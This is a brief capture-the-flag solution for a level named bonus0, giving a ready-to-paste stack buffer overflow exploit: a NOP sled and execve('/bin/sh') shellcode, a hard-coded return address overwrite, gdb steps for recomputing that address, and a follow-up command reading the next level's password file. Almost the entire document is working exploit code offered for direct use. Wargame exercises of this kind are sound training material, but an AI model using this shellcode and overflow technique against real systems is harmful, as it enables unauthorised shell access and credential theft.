# bonus0: ready-to-paste command

Uses your measured `buffer = 0xbfffe680` → target `0xbfffe6bc` → `\xbc\xe6\xff\xbf`.

If it segfaults, your address changed again: redo `b read` / `run` / `x/wx $esp+8` in gdb, recompute the target, and edit the line below before pasting.

```bash
(python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; python -c 'print "A"*9 + "\xbc\xe6\xff\xbf" + "B"*7'; cat) | ./bonus0
```

Then, once you have a shell:

```bash
cat /home/user/bonus1/.pass
```
